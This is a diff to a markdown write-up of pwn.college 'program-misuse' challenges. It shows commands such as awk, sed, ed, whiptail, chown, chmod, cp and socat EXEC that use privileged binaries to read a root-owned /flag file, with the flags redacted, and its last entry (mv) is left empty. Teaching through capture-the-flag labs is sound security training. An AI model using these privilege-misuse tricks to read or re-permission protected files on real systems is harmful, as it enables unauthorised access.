@@ -1,4 +1,6 @@
 
+**NOTE: I have intentionally not added the flags so that you can practice on your own and actually type the commands and see them perform the magic instead of copying them without understanding.**
+
 ## 1. `cat`
 
 ```bash
@@ -443,5 +445,94 @@ watch -x cat /flag
 hacker@program-misuse~socat:/challenge$ socat EXEC:'cat /flag' STDIO
 pwn.college{xxxxxxxxFLAGxxxxxxxx}
 pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 33. `whiptail`
+
+`whiptail` command is used to allow shell scripts to display boxes to the user for informational purposes. We are going to used the `--textbox` switch to display the contents of the flag file. **SYNTAX** => `whiptail --textbox <file> <height> <width>` . When the command is run the contents are displayed in a box. The height and width is of the same box.
+
+```bash
+hacker@program-misuse~whiptail:/challenge$ whiptail --textbox /flag 30 30
+```
+
+
+## 34. `awk`
+
+`awk` is a powerful text processing and pattern scanning tool in Linux. To a read a file and all its contents we use the `'{print}'` switch.
+
+```bash
+hacker@program-misuse~awk:/challenge$ awk '{print}' /flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 35. `sed`
+
+`sed` command is a basic non interactive text editor and we can use this command to perform various operations as well. To read all the contents of the file without making any modifications we use `''` notation.
+
+```bash
+hacker@program-misuse~sed:/challenge$ sed '' /flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 36. `ed`
+
+`ed` is a simple text editor which was way before advanced or modern text editors like `vim` came to Linux. The `,p` command is used to print all the lines of the file.
+
+```bash
+hacker@program-misuse~ed:/challenge$ ed /flag
+57
+,p
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+q
+```
+
+
+## 37. `chown`
+
+`chown` command is to change owner of the file permissions. Changed the flag file permissions to the non root user so that we can read the flag file contents.
+
+```bash
+hacker@program-misuse~chown:/challenge$ chown hacker /flag
+hacker@program-misuse~chown:/challenge$ ls -l /flag
+-r-------- 1 hacker root 57 Nov 13 18:33 /flag
+hacker@program-misuse~chown:/challenge$ cat /flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 38. `chmod`
+
+`chmod` command can be used to change the **read - r**, **write - w**, **execute -x** permissions of the file for **owner**, **groups** and **others**. `444` basically means setting read permissions for owner, group and others for the flag file. `4 = read(r)` permission.
+
+```bash
+hacker@program-misuse~chmod:/challenge$ chmod 444 /flag
+hacker@program-misuse~chmod:/challenge$ ls -l /flag
+-r--r--r-- 1 root root 57 Nov 13 18:37 /flag
+hacker@program-misuse~chmod:/challenge$ cat /flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 39. `cp`
+
+`cp` command is used to copy a file and store into our desired target location. Its important that you create a file which will act as the target location where you will drop the contents of the flag file. This makes sure that the dummy flag file has sufficient permissions for us.
+
+```bash
+hacker@program-misuse~cp:/challenge$ touch /tmp/flagCopy
+hacker@program-misuse~cp:/challenge$ cp /flag /tmp/flagCopy
+hacker@program-misuse~cp:/challenge$ cat /tmp/flagCopy
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 40. `mv`
+
+`mv` command is basically cut operation. We use this command to cut a file or folder and change the original location of the file. We can also use it to rename a file.
+
+```bash
+
 ```
 
